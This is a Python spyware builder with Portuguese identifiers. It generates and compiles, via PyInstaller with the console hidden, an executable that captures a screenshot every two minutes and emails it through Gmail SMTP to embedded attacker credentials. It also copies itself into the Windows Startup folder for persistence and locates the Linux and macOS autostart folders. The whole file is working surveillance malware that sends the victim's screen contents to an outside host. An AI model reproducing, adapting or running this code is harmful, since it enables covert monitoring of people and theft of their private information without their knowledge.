import os
import sys
import shutil
import pyautogui
import smtplib
import io
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from PyInstaller.__main__ import run

def executar_system(remetente, destinatario, senha):
    # conteúdo do novo script com os dados embutidos
    conteudo = f"""
import os, platform, pyautogui, smtplib, io, sys, time, shutil
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage

def Localizar_iniciador_Unix():
    sistema = platform.system()
    if sistema == "Linux":
        startup_folder = os.path.expanduser("~/.config/autostart")
    elif sistema == "Darwin":
        startup_folder = os.path.expanduser("~/Library/LaunchAgents")
    else:
        print("Sistema não suportado:", sistema)
        return None
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder)
    print("Pasta de inicialização:", startup_folder)
    return startup_folder

def Localizar_iniciador_Win():
    user_profile = os.environ["USERPROFILE"]
    startup_folder = os.path.join(
        user_profile,
        "AppData",
        "Roaming",
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup"
    )
    print("Pasta de inicialização:", startup_folder)
    return startup_folder

def mover_para_inicializador():
    startup_folder = Localizar_iniciador_Win()
    exe_path = sys.executable
    destino = os.path.join(startup_folder, os.path.basename(exe_path))
    if not os.path.exists(destino):
        shutil.copy(exe_path, destino)
        print(f"Executável copiado para inicialização: {{destino}}")
    else:
        print("Já existe na pasta de inicialização.")

def capturar_tela_pyautogui():
    screenshot = pyautogui.screenshot()
    return screenshot

def enviar_email():
    msg = MIMEMultipart()
    msg["From"] = "{remetente}"
    msg["To"] = "{destinatario}"
    msg["Subject"] = "Screenshot automática"
    msg.attach(MIMEText("Segue em anexo a screenshot capturada automaticamente.", "plain"))
    try:
        print_screen = capturar_tela_pyautogui()
        img_bytes = io.BytesIO()
        print_screen.save(img_bytes, format="PNG")
        img_bytes.seek(0)
        image_attachment = MIMEImage(img_bytes.read(), name="screenshot.png")
        msg.attach(image_attachment)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login("{remetente}", "{senha}")
        server.sendmail("{remetente}", "{destinatario}", msg.as_string())
        server.quit()
        print("E-mail enviado com sucesso!")
    except Exception as e:
        print("Erro:", e)

def cronometro():
    alternador = True
    while True:
        print("\\n⏱️ Aguardando 2 minutos para próxima captura...")
        time.sleep(120)
        enviar_email()
        if alternador:
            print("Iniciando Windows...")
            Localizar_iniciador_Win()
            mover_para_inicializador()
        else:
            print("Iniciando Linux/macOS...")
            Localizar_iniciador_Unix()
        alternador = not alternador

cronometro()
"""

    # salva o script gerado
    caminho_script = "ExecutavelGerado.py"
    with open(caminho_script, "w", encoding="utf-8") as f:
        f.write(conteudo)

    # gera o executável com PyInstaller
    argumentos = [
        caminho_script,
        "--onefile",
        "--noconsole",
        "--name", "ExecutavelFinal"
    ]
    run(argumentos)
